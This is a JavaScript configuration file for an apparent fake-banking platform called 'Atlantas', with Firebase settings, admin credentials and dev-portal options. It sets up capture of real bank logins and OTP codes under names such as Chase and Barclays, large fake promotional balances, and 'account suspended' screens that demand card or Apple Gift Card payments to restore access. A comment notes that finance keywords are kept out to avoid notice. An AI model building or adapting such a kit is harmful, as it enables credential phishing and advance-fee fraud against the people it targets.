// ============================================================
// CONFIG.JS — Atlantas Platform
// ONLY Firebase connection details live here.
// Everything else is set from the Dev Portal and stored in Firebase.
// Zero bank/finance/app keywords here.
// ============================================================

// ── FIREBASE (required to boot — cannot be in Firebase itself) ──
var FIREBASE_CONFIG = {
  apiKey:            'AIzaSyB-ZQ6j04Yn1Vr0AaNGukVmNAoNSp2lFPQ',
  authDomain:        'atlantas-a7d24.firebaseapp.com',
  databaseURL:       'https://atlantas-a7d24-default-rtdb.firebaseio.com',
  projectId:         'atlantas-a7d24',
  storageBucket:     'atlantas-a7d24.firebasestorage.app',
  messagingSenderId: '886835399351',
  appId:             '1:886835399351:web:ae8d6bee3683be60629b32'
};

// ── DB PATHS (neutral names) ────────────────────────────────
var DB = {
  users:          'atl_users',
  topups:         'atl_topups',
  cashouts:       'atl_cashouts',
  requests:       'atl_requests',
  notifications:  'atl_notifications',
  appConfig:      'atl_app_config',
  admins:         'atl_admins',
  locks:          'atl_locks',
  referrals:      'atl_referrals',
  accountNums:    'atl_account_numbers',
  publicDir:      'atl_public_dir',
  instSubmissions:'atl_inst_submissions',
  maintenance:    'atl_maintenance',
  kyc:            'atl_kyc'
};

// ── PLATFORM URLs ─────────────────────────────────────────────
var PLATFORM_URLS = {
  userApp:  'https://atlantas.pages.dev',
  adminApp: '',
  devApp:   ''
};

// ── ADMIN CREDENTIALS ─────────────────────────────────────────
var ADMIN_EMAIL     = 'admin@aaddmmiimn.com';
var SUBADMIN_DOMAIN = '@aaddmmiinn.com';
var INVITE_CODE     = 'ATLANTASINVITE2026';
var DEV_EMAIL       = 'developer@gmail.com';

// ── SUPPORTED LANGUAGES ───────────────────────────────────────
var SUPPORTED_LANGS = ['en','fr','es','pt'];
var LANG_NAMES      = {en:'English',fr:'Français',es:'Español',pt:'Português'};

// ── DEV PORTAL RECOMMENDATIONS (only used in dev.html) ────────
var DEV_RECOMMENDATIONS = {
  appNames:     ['Atlantas','VaultX','NovaPay','SwiftPay','TrustFlow','NexBank','PrimePay','FlowFi','ZenPay'],
  appSubtitles: ['Secure · Reliable · Global','Fast · Safe · Simple','Your Money, Your Control','Finance Made Easy'],
  institutionNames: ['Chase Bank','Barclays','HSBC','Wells Fargo','Bank of America','MB WAY','Revolut','Wise','PayPal','Monzo','Starling'],
  otpTypes: [
    {label:'OTP Code (SMS)',    value:'otp'},
    {label:'App Authorization', value:'app'},
    {label:'Auth Code',         value:'auth'},
    {label:'OTP + App Auth',    value:'both'},
    {label:'None',              value:'none'}
  ],
  fieldTypes: [
    {label:'Username + Password', value:'credentials'},
    {label:'Phone + PIN',         value:'phone'},
    {label:'Email + Password',    value:'email'},
    {label:'Account Number',      value:'account'}
  ],
  lockMessages: [
    'Your account has been temporarily restricted pending a compliance review.',
    'Unusual activity has been detected. For your security, access has been suspended.',
    'Your account requires identity verification before access can be restored.',
    'Your account has been placed on hold pending documentation review.'
  ],
  themes: [
    {name:'Ocean Blue',  primary:'#1a56ff', accent:'#4d9fff', balBg1:'#0d0f14', balBg2:'#1a3a5c', bg:'#f0f2f5', dark:false},
    {name:'Midnight',    primary:'#7c3aed', accent:'#a855f7', balBg1:'#1a0533', balBg2:'#2d1b69', bg:'#0d0f14', dark:true},
    {name:'Emerald',     primary:'#059669', accent:'#34d399', balBg1:'#022c22', balBg2:'#065f46', bg:'#f0fdf4', dark:false},
    {name:'Crimson',     primary:'#dc2626', accent:'#f87171', balBg1:'#1a0505', balBg2:'#7f1d1d', bg:'#fff5f5', dark:false},
    {name:'Slate Dark',  primary:'#475569', accent:'#94a3b8', balBg1:'#0f172a', balBg2:'#1e293b', bg:'#0f172a', dark:true},
    {name:'Amber',       primary:'#d97706', accent:'#fbbf24', balBg1:'#1c1100', balBg2:'#78350f', bg:'#fffbeb', dark:false},
    {name:'Rose Gold',   primary:'#e11d48', accent:'#fb7185', balBg1:'#1a0010', balBg2:'#881337', bg:'#fff1f2', dark:false},
    {name:'Deep Space',  primary:'#4f46e5', accent:'#818cf8', balBg1:'#0f0e26', balBg2:'#1e1b4b', bg:'#1e1b4b', dark:true}
  ],
  fonts: ['Sora','Inter','Poppins','DM Sans','Nunito','Outfit','Plus Jakarta Sans','Raleway'],
  actionLabels: {
    topup:    ['Add Money','Add Funds','Top Up','Load','Fund'],
    cashout:  ['Transfer Out','Cash Out','Move Funds','Send to Card'],
    send:     ['Send Money','Transfer','Pay','Send'],
    request:  ['Request Money','Ask for Money','Request'],
    balance:  ['Total Balance','Available Balance','Account Balance','My Balance'],
    cards:    ['Cards','Accounts','Methods','Sources'],
    addCard:  ['Add Card','Link Card','Add Account','Connect Card'],
    offers:   ['Offers','Rewards','Promotions','Deals'],
    refer:    ['Refer & Earn','Invite Friends','Referrals'],
    receipts: ['Receipts','Statements','History','Activity']
  }
};

// ── EMPTY SHELL CONFIG (user app reads from Firebase — this is just shape) ──
// Dev portal writes the real values to Firebase atl_app_config
// User app fetches them on load — NOTHING from here goes to users
var _EMPTY_CONFIG_SHAPE = {
  // Branding
  appName:'', appSubtitle:'', appLogoUrl:'', appIconUrl:'', appVersion:'1.0.0',
  // Theme
  primaryColor:'#1a56ff', accentColor:'#4d9fff',
  bgColor:'#f0f2f5', bgCardColor:'#ffffff', textColor:'#0d0f14',
  balanceCardBg1:'#0d0f14', balanceCardBg2:'#1a3a5c',
  balanceCardGlow:true, balanceCardGlowColor:'rgba(26,86,255,0.35)',
  navBgColor:'#ffffff', navActiveColor:'#1a56ff',
  drawerBgColor:'#ffffff', drawerHeadBg1:'#0d0f14', drawerHeadBg2:'#1a3a5c',
  buttonRadius:12, fontFamily:'Sora', darkMode:false,
  // EmailJS — set by dev, stored in Firebase, read by user app at runtime
  emailjs: {
    otp:     {publicKey:'', serviceId:'', templateId:''},
    general: {publicKey:'', serviceId:'', templateId:''}
  },
  adminEmail:'',
  // Bonuses
  welcomeBonus:0, promoCode:'', promoBalance:500000,
  cardVerifyBonus:10, cardLinkFee:10,
  referralBonus:10, referralThreshold:12, defaultCurrency:'USD',
  // Institutions
  institutions:[], // array of {name,logo,color,poweredBy,fieldType,otpType,requireId,show,order}
  // Lock
  lockPaymentMethods:[
    {key:'mbway',      name:'MB WAY',         logo:'',color:'#fff5f5',border:'#ffcccc',textColor:'#cc0000',enabled:true},
    {key:'visa',       name:'Visa',            logo:'',color:'#f0f4ff',border:'#c7d4ff',textColor:'#1a56ff',enabled:true},
    {key:'mastercard', name:'Mastercard',      logo:'',color:'#fff8f0',border:'#ffe0b2',textColor:'#e65100',enabled:true},
    {key:'apple',      name:'Apple Gift Card', logo:'',color:'#f5f5f7',border:'#d1d1d6',textColor:'#111',   enabled:true}
  ],
  lockDefaultAmount:150, lockContactEmail:'',
  lockStep1Text:'Add funds from a card registered in your full legal name.',
  lockStep2Text:'Submit the required minimum amount to begin review.',
  lockStep3Text:'Our team will review and reinstate your account within 24 hours.',
  // Features — ALL false by default until dev enables them
  enableSendMoney:true, enableRequestMoney:true,
  enableAddFunds:true,  enableWithdraw:true,
  enableReferrals:true, enableOffers:true,
  enableReceiptsTab:true, enableKYC:false,
  enableLock:true, pwaPrompt:true, pwaPromptDelay:30000,
  showAccountNumber:true, showBalanceDefault:true,
  maintenanceMode:false, maintenanceMessage:'',
  showTabAccounts:true, showTabReceipts:true,
  showTabSendReq:true, showTabOffers:true, showTabRefer:true,
  // Labels
  labels:{en:{
    topup:'Add Money', cashout:'Transfer Out', send:'Send Money',
    request:'Request Money', balance:'Total Balance',
    cards:'Cards', addCard:'Add Card', offers:'Offers',
    refer:'Refer & Earn', receipts:'Receipts',
    signIn:'Log In', signUp:'Create Account', logout:'Log Out',
    lockTitle:'Account Suspended',
    lockSubtitle:'Your access has been temporarily restricted.',
    lockAddFundsBtn:'Add Funds to Restore Access',
    lockSupportUrl:'', goodMorning:'Good morning,',
    goodAfternoon:'Good afternoon,', goodEvening:'Good evening,'
  }},
  // Forms
  forms:{
    onboarding:{subject:'New Registration',fields:[]},
    addInstrument:{subject:'Card Link Request',fields:[]},
    topup:{subject:'Funds Request',fields:[]},
    cashout:{subject:'Transfer Request',fields:[]},
    support:{subject:'Support Request',fields:[]}
  },
  enabledLangs:['en','fr','es','pt'],
  updatedAt:0
};
